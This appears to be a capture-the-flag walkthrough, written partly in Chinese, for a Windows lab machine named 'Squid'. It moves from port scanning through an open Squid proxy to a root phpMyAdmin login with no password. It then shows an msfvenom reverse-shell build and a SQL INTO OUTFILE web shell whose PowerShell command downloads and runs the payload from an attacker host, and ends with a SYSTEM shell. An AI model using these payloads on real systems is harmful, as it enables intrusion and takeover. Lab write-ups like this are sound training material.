# Squid
![image](https://hackmd.io/_uploads/rk2UCxhnJx.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.133.189
...
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-22T09:15:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 354.50 seconds
```
> http proxy, RPC
### 2. enum4linux & smbclient
```
┌──(chw㉿CHW)-[~]
└─$ enum4linux -a 192.168.133.189

┌──(chw㉿CHW)-[~]
└─$ smbclient -N -L \\\\192.168.133.189\\
session setup failed: NT_STATUS_ACCESS_DENIED

```
> 皆沒有可用資訊

### 3. http-proxy scanner
使用 [spose](https://github.com/aancw/spose) 掛上 proxy 再掃描一次
```
┌──(chw㉿CHW)-[~/Tools]
└─$ git clone https://github.com/aancw/spose.git

┌──(chw㉿CHW)-[~/Tools/spose_http-proxy-scanner]
└─$ python3 spose.py --proxy http://192.168.133.189:3128 --target 192.168.133.189
Scanning default common ports
Using proxy address http://192.168.133.189:3128
192.168.133.189:3306 seems OPEN
192.168.133.189:8080 seems OPEN
```
> 發現 3306 & 8080

### 3. Browser http-proxy
Browser 掛上題目 http-proxy\
![image](https://hackmd.io/_uploads/BJz0f-3h1l.png)

瀏覽 192.168.133.189:8080\
![image](https://hackmd.io/_uploads/Hk1FFW3nJl.png)
> Wampserver 3.2.3\
> ![image](https://hackmd.io/_uploads/HJ4_hb33yl.png)


### 4. Dirb with proxy
```
┌──(chw㉿CHW)-[~]
└─$ dirb http://192.168.133.189:8080/ -p 192.168.133.189:3128
```
> 其實也不用爆破，192.168.133.189:8080
> 有顯示 `phpinfo()` 與 `phpMyadmin`

### 5. phpMyadmin
http://192.168.133.189:8080/phpmyadmin/index.php\
![image](https://hackmd.io/_uploads/SJFkJGhhyx.png)
> admin:amdin (失敗)
> root:{無密碼} (成功 ?!)

瀏覽資料庫:
- user\
![image](https://hackmd.io/_uploads/H1xq1z321g.png)

目標： 寫 revershell 進資料庫\
從 phpinfo() 中可以得知路徑在 `C:\wamp`\
 ![image](https://hackmd.io/_uploads/SkvAWzn21e.png)

### 6. Reverse Shell
#### 6.1 建立 Reverse Shell file
```
┌──(chw㉿CHW)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o chw_windows.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: chw_windows.exe

┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
#### 6.2 Ｗindows 指令注入 mysql
```
SELECT "<?php system('powershell -c \"Invoke-WebRequest -Uri http://192.168.45.165/chw_windows.exe -OutFile C:\\windows\\temp\\rs.exe; Start-Process C:\\windows\\temp\\rs.exe\"'); ?>"
INTO OUTFILE "C:/wamp/www/rev.php"
```
![image](https://hackmd.io/_uploads/B1I7wG2n1g.png)\
(Kali)\
開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.133.189] 50486
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\wamp\www>

```

瀏覽 http://192.168.133.189:8080/rev.php

### 7. 取得 reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.133.189] 50486
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\wamp\www>hostname
hostname
SQUID

C:\wamp\www>whoami
whoami
nt authority\system

```
### ✅ Get Root FLAG
> 在 `C:\Users\Administrator\Desktop`找到 Root flag
